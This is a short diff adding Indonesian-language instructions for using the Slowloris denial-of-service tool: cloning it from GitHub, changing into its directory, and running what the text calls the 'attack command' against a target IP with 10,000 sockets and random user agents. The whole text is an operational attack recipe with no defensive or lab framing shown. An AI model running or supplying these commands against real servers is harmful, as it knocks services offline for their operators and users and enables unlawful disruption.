@@ -1,1 +1,9 @@
+Untuk mendapatkan tool Slowloris
+git clone https://github.com/gkbrk/slowloris
+
+Untuk mengubah direktori
+cd slowloris
+
+Perintah attack
+./slowloris.py (ip) -v -ua -s 10000
 
